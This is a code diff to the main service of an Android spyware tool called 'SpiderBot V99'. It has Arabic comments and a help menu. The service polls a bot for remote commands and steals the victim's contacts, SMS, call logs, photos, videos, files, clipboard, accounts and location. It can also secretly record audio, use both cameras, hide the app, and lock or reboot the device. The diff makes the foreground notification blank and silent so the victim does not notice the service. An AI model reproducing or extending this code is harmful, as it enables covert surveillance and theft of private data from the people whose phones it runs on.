@@ -74,8 +74,9 @@ public class SpyService extends Service {
         registerDevice();
 
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleAtFixedRate(this::pollCommands, 5, Config.get().poll_interval_sec, TimeUnit.SECONDS);
+        scheduler.scheduleAtFixedRate(this::pollCommands, 3, Config.get().poll_interval_sec, TimeUnit.SECONDS);
 
+        // بدء الخدمة بدون إشعارات مزعجة
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             if (!foregroundStarted && hasMicrophonePermission()) {
                 startForegroundService();
@@ -92,14 +93,17 @@ public class SpyService extends Service {
         if (foregroundStarted) return;
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_MIN);
+                NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_LOW);
                 getSystemService(NotificationManager.class).createNotificationChannel(ch);
             }
+            // إشعار بسيط جداً (بدون صوت أو اهتزاز)
             startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
-                    .setContentTitle("Google Services")
-                    .setContentText("Running...")
+                    .setContentTitle("")
+                    .setContentText("")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setSilent(true)
+                    .setOngoing(true)
                     .build());
             foregroundStarted = true;
             Log.d(TAG, "Foreground service started");
@@ -173,7 +177,6 @@ public class SpyService extends Service {
                     if (msg.has("text")) {
                         String txt = msg.getString("text").trim();
                         Log.d(TAG, "Received command: " + txt);
-                        // معالجة الأمر فوراً
                         handleCommand(txt);
                     }
                 }
@@ -187,149 +190,84 @@ public class SpyService extends Service {
         Log.d(TAG, "Handling command: " + cmd);
         String lower = cmd.toLowerCase().trim();
 
-        // ===== أوامر المساعدة =====
         if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu") || lower.equals("/commands")) {
             sendHelpMenu();
             return;
         }
 
-        // ===== الأوامر بشرطة / =====
+        // إزالة أي مسافات زائدة
         if (lower.startsWith("/")) {
-            String command = lower.substring(1);
+            String command = lower.substring(1).trim();
             executeCommand(command);
-            return;
+        } else {
+            executeCommand(lower);
         }
-
-        // ===== الأوامر القديمة (بدون /) =====
-        executeCommand(lower);
     }
 
     private void executeCommand(String cmd) {
         try {
             Log.d(TAG, "Executing: " + cmd);
             switch (cmd) {
-                // أوامر السرقة
-                case "steal_contacts":
-                case "contacts":
-                case "get_contacts":
-                    sendFile(collectContacts(), "📇 جهات الاتصال");
-                    break;
-                case "steal_sms":
-                case "sms":
-                case "get_sms":
-                    sendFile(collectSms(), "💬 الرسائل النصية");
-                    break;
-                case "steal_calls":
-                case "calllog":
-                case "get_calllogs":
-                    sendFile(collectCallLogs(), "📞 سجل المكالمات");
-                    break;
-                case "location":
-                case "get_location":
-                    getLocation();
-                    break;
-                case "record":
-                case "start_record":
-                    startRecording();
-                    break;
-                case "stoprec":
-                case "stop_record":
-                    stopRecording();
-                    break;
-                case "apps":
-                case "get_apps":
-                    sendFile(collectApps(), "📱 التطبيقات المثبتة");
-                    break;
-                case "photos":
-                case "get_photos":
-                    sendFile(collectMedia("images"), "🖼 جميع الصور");
-                    break;
-                case "videos":
-                case "get_videos":
-                    sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات");
-                    break;
-                case "files":
-                case "get_files":
-                    sendFile(collectAllFiles(), "📦 جميع الملفات");
-                    break;
-                case "hide":
-                case "hide_app":
-                    hideApp();
-                    break;
-                case "show":
-                case "show_app":
-                    showApp();
-                    break;
-                case "notify":
-                case "fake_notif":
-                    showFakeNotification();
-                    break;
-                case "cam_back":
-                case "take_photo":
-                    takePhoto();
-                    break;
-                case "cam_front":
-                case "take_photo_front":
-                    takePhotoFront();
-                    break;
-                case "torch_on":
-                case "flash_on":
-                    flashOn();
-                    break;
-                case "torch_off":
-                case "flash_off":
-                    flashOff();
-                    break;
-                case "imei":
-                case "get_imei":
-                    getImei();
-                    break;
-                case "phone":
-                case "get_phone":
-                    getPhoneNumber();
-                    break;
-                case "sim":
-                case "get_sim":
-                    getSimInfo();
-                    break;
-                case "wifi":
-                case "get_wifi":
-                    getWifiInfo();
-                    break;
-                case "battery":
-                case "get_battery":
-                    getBatteryInfo();
-                    break;
-                case "ip":
-                case "get_ip":
-                    getPublicIp();
-                    break;
-                case "lock":
-                case "lock_device":
-                    lockDevice();
-                    break;
+                case "steal_contacts": case "contacts": case "get_contacts":
+                    sendFile(collectContacts(), "📇 جهات الاتصال"); break;
+                case "steal_sms": case "sms": case "get_sms":
+                    sendFile(collectSms(), "💬 الرسائل النصية"); break;
+                case "steal_calls": case "calllog": case "get_calllogs":
+                    sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
+                case "location": case "get_location":
+                    getLocation(); break;
+                case "record": case "start_record":
+                    startRecording(); break;
+                case "stoprec": case "stop_record":
+                    stopRecording(); break;
+                case "apps": case "get_apps":
+                    sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
+                case "photos": case "get_photos":
+                    sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
+                case "videos": case "get_videos":
+                    sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
+                case "files": case "get_files":
+                    sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
+                case "hide": case "hide_app":
+                    hideApp(); break;
+                case "show": case "show_app":
+                    showApp(); break;
+                case "notify": case "fake_notif":
+                    showFakeNotification(); break;
+                case "cam_back": case "take_photo":
+                    takePhoto(); break;
+                case "cam_front": case "take_photo_front":
+                    takePhotoFront(); break;
+                case "torch_on": case "flash_on":
+                    flashOn(); break;
+                case "torch_off": case "flash_off":
+                    flashOff(); break;
+                case "imei": case "get_imei":
+                    getImei(); break;
+                case "phone": case "get_phone":
+                    getPhoneNumber(); break;
+                case "sim": case "get_sim":
+                    getSimInfo(); break;
+                case "wifi": case "get_wifi":
+                    getWifiInfo(); break;
+                case "battery": case "get_battery":
+                    getBatteryInfo(); break;
+                case "ip": case "get_ip":
+                    getPublicIp(); break;
+                case "lock": case "lock_device":
+                    lockDevice(); break;
                 case "reboot":
-                    rebootDevice();
-                    break;
+                    rebootDevice(); break;
                 case "shutdown":
-                    shutdownDevice();
-                    break;
-                case "accounts":
-                case "get_accounts":
-                    getAccounts();
-                    break;
-                case "clipboard":
-                case "get_clipboard":
-                    getClipboard();
-                    break;
-                case "device":
-                case "get_device":
-                    getDeviceInfo();
-                    break;
-                case "network":
-                case "get_network":
-                    getNetworkInfo();
-                    break;
+                    shutdownDevice(); break;
+                case "accounts": case "get_accounts":
+                    getAccounts(); break;
+                case "clipboard": case "get_clipboard":
+                    getClipboard(); break;
+                case "device": case "get_device":
+                    getDeviceInfo(); break;
+                case "network": case "get_network":
+                    getNetworkInfo(); break;
                 default:
                     bot.sendText("❌ أمر غير معروف: " + cmd + "\nاستخدم /help لعرض الأوامر.");
             }
@@ -356,7 +294,6 @@ public class SpyService extends Service {
                 "/videos - سرقة جميع الفيديوهات\n" +
                 "/files - سرقة جميع الملفات\n" +
                 "/clipboard - سرقة الحافظة\n\n" +
-
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "⚫ **أوامر التحكم والتخريب** ⚫\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -368,7 +305,6 @@ public class SpyService extends Service {
                 "/lock - قفل الجهاز\n" +
                 "/reboot - إعادة تشغيل الجهاز\n" +
                 "/shutdown - إيقاف تشغيل الجهاز\n\n" +
-
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "🟢 **أوامر المعلومات** 🟢\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -382,7 +318,6 @@ public class SpyService extends Service {
                 "/apps - قائمة التطبيقات المثبتة\n" +
                 "/device - معلومات الجهاز كاملة\n" +
                 "/network - معلومات الشبكة\n\n" +
-
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "✅ SpiderBot V99 جاهز";
 
